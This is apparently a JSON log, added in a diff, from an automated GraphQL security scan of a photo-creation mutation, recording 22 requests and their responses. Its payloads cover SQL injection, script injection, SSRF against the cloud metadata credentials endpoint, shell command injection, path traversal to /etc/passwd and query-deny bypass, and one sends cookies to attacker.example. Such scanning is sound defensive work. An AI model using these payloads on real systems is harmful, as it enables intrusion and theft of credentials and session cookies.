@@ -1,0 +1,784 @@
+[
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"Sunset at the Lake\", url: \"https://example.com/photos/101.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/101.jpg\", albumId: \"1\"}) {\n    id\n    title\n    url\n    thumbnailUrl\n    album {\n      id\n      title\n      user {\n        id\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.935,
+    "timestamp": "2025-09-23T17:19:29.594990Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"albumId\" is not defined by type \"CreatePhotoInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 154
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"Robert'); DROP TABLE photos; --\", url: \"https://example.com/photos/102.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/102.jpg\", albumId: \"1\"}) {\n    id\n    title\n    url\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.852,
+    "timestamp": "2025-09-23T17:19:32.915130Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"albumId\" is not defined by type \"CreatePhotoInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 167
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"<script>alert('xss')</script>\", url: \"https://example.com/photos/103.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/103.jpg\", albumId: \"1\"}) {\n    id\n    title\n    thumbnailUrl\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.618,
+    "timestamp": "2025-09-23T17:19:35.322228Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"albumId\" is not defined by type \"CreatePhotoInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 165
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"Probe IMDS\", url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\", thumbnailUrl: \"http://127.0.0.1/status\", albumId: \"1\"}) {\n    id\n    url\n    thumbnailUrl\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.889,
+    "timestamp": "2025-09-23T17:19:38.255581Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"albumId\" is not defined by type \"CreatePhotoInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 159
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"list; /bin/ls -la /etc || echo done\", url: \"https://example.com/photos/104.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/104.jpg\", albumId: \"1\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.805,
+    "timestamp": "2025-09-23T17:19:41.649807Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"albumId\" is not defined by type \"CreatePhotoInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 171
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"Fetch secret\", url: \"https://example.com/photos/105.jpg\", thumbnailUrl: \"../../../../../../etc/passwd\", albumId: \"1\"}) {\n    id\n    thumbnailUrl\n    url\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.84,
+    "timestamp": "2025-09-23T17:19:44.461536Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"albumId\" is not defined by type \"CreatePhotoInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 135
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"<div class='injected'>Hello</div>\", url: \"https://example.com/photos/106.jpg\", thumbnailUrl: \"<img src=x onerror=\\\"fetch('https://attacker.example/collect?c='+document.cookie)\\\">\", albumId: \"1\"}) {\n    id\n    title\n    thumbnailUrl\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.048,
+    "timestamp": "2025-09-23T17:19:47.778633Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"albumId\" is not defined by type \"CreatePhotoInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 212
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"Attempt edit protected album\", url: \"https://example.com/photos/107.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/107.jpg\", albumId: \"999\"}) {\n    id\n    title\n    album {\n      id\n      title\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.805,
+        "timestamp": "2025-09-23T17:19:50.631809Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Field \"albumId\" is not defined by type \"CreatePhotoInput\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 164
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED"
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.804,
+        "timestamp": "2025-09-23T17:19:51.436089Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Field \"albumId\" is not defined by type \"CreatePhotoInput\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 177
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-09-23T17:19:51.436353Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.597,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  s: createPhoto(input: {title: \"Attempt edit protected album (aliased)\", url: \"https://example.com/photos/108.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/108.jpg\", albumId: \"999\"}) {\n    id\n    title\n    album {\n      id\n      title\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.779,
+        "timestamp": "2025-09-23T17:19:54.372763Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Field \"albumId\" is not defined by type \"CreatePhotoInput\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 164
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED"
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 1.077,
+        "timestamp": "2025-09-23T17:19:55.449743Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Field \"albumId\" is not defined by type \"CreatePhotoInput\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 177
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-09-23T17:19:55.449863Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.779,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  createPhoto {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    types {\n      name\n      kind\n      fields {\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.656,
+    "timestamp": "2025-09-23T17:19:58.472515Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"createPhoto\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"Typo fields test\", url: \"https://example.com/photos/109.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/109.jpg\", albumId: \"1\"}) {\n    id\n    titlle\n    urll\n    thumbnailUrl\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.174,
+    "timestamp": "2025-09-23T17:20:01.356584Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"albumId\" is not defined by type \"CreatePhotoInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 152
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"titlle\" on type \"Photo\". Did you mean \"title\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"urll\" on type \"Photo\". Did you mean \"url\"?",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"Sunset at the Lake\", url: \"https://example.com/photos/101.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/101.jpg\"}) {\n    id\n    title\n    url\n    thumbnailUrl\n    album {\n      id\n      title\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.983,
+    "timestamp": "2025-09-23T17:22:43.084327Z",
+    "count": 12,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "createPhoto": {
+          "id": "5001",
+          "title": "Sunset at the Lake",
+          "url": "https://example.com/photos/101.jpg",
+          "thumbnailUrl": "https://example.com/photos/thumbs/101.jpg",
+          "album": {
+            "id": null,
+            "title": null
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"Robert'); DROP TABLE photos; --\", url: \"https://example.com/photos/102.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/102.jpg\"}) {\n    id\n    title\n    url\n    thumbnailUrl\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.859,
+    "timestamp": "2025-09-23T17:22:46.783170Z",
+    "count": 13,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "createPhoto": {
+          "id": "5001",
+          "title": "Robert'); DROP TABLE photos; --",
+          "url": "https://example.com/photos/102.jpg",
+          "thumbnailUrl": "https://example.com/photos/thumbs/102.jpg"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"<script>alert('xss')</script>\", url: \"https://example.com/photos/103.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/103.jpg\"}) {\n    id\n    title\n    thumbnailUrl\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.957,
+    "timestamp": "2025-09-23T17:22:50.566813Z",
+    "count": 14,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "createPhoto": {
+          "id": "5001",
+          "title": "<script>alert('xss')</script>",
+          "thumbnailUrl": "https://example.com/photos/thumbs/103.jpg"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"Probe IMDS\", url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\", thumbnailUrl: \"http://127.0.0.1/status\"}) {\n    id\n    url\n    thumbnailUrl\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.806,
+    "timestamp": "2025-09-23T17:22:53.397571Z",
+    "count": 15,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "createPhoto": {
+          "id": "5001",
+          "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "thumbnailUrl": "http://127.0.0.1/status"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"payload; /bin/ls -la /etc || echo done\", url: \"https://example.com/photos/104.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/104.jpg\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.873,
+    "timestamp": "2025-09-23T17:22:56.265001Z",
+    "count": 16,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "createPhoto": {
+          "id": "5001",
+          "title": "payload; /bin/ls -la /etc || echo done"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"Fetch secret\", url: \"https://example.com/photos/105.jpg\", thumbnailUrl: \"../../../../../../etc/passwd\"}) {\n    id\n    thumbnailUrl\n    url\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.046,
+    "timestamp": "2025-09-23T17:22:59.230435Z",
+    "count": 17,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "createPhoto": {
+          "id": "5001",
+          "thumbnailUrl": "../../../../../../etc/passwd",
+          "url": "https://example.com/photos/105.jpg"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"<div class='injected'>Hello</div>\", url: \"https://example.com/photos/106.jpg\", thumbnailUrl: \"<img src=x onerror='alert(document.cookie)'>\"}) {\n    id\n    title\n    thumbnailUrl\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.602,
+    "timestamp": "2025-09-23T17:23:01.587669Z",
+    "count": 18,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "createPhoto": {
+          "id": "5001",
+          "title": "<div class='injected'>Hello</div>",
+          "thumbnailUrl": "<img src=x onerror='alert(document.cookie)'>"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"Access control test\", url: \"https://example.com/photos/107.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/107.jpg\"}) {\n    id\n    title\n    url\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.855,
+        "timestamp": "2025-09-23T17:23:04.908581Z",
+        "response_body": {
+          "data": {
+            "createPhoto": {
+              "id": "5001",
+              "title": "Access control test",
+              "url": "https://example.com/photos/107.jpg"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.797,
+        "timestamp": "2025-09-23T17:23:05.706085Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "5001",
+              "title": "Access control test (aliased)",
+              "url": "https://example.com/photos/108.jpg"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 19,
+    "timestamp": "2025-09-23T17:23:05.706136Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.866,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  s: createPhoto(input: {title: \"Access control test (aliased)\", url: \"https://example.com/photos/108.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/108.jpg\"}) {\n    id\n    title\n    url\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.634,
+        "timestamp": "2025-09-23T17:23:09.533118Z",
+        "response_body": {
+          "data": {
+            "createPhoto": {
+              "id": "5001",
+              "title": "Access control test",
+              "url": "https://example.com/photos/107.jpg"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.604,
+        "timestamp": "2025-09-23T17:23:10.136961Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "5001",
+              "title": "Access control test (aliased)",
+              "url": "https://example.com/photos/108.jpg"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 20,
+    "timestamp": "2025-09-23T17:23:10.137063Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.642,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  createPhoto {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.604,
+    "timestamp": "2025-09-23T17:23:13.660680Z",
+    "count": 21,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"createPhoto\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPhoto(input: {title: \"Typo fields test\", url: \"https://example.com/photos/109.jpg\", thumbnailUrl: \"https://example.com/photos/thumbs/109.jpg\"}) {\n    id\n    titlle\n    urll\n    thumbnailUrl\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.829,
+    "timestamp": "2025-09-23T17:23:17.145660Z",
+    "count": 22,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"titlle\" on type \"Photo\". Did you mean \"title\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"urll\" on type \"Photo\". Did you mean \"url\"?",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
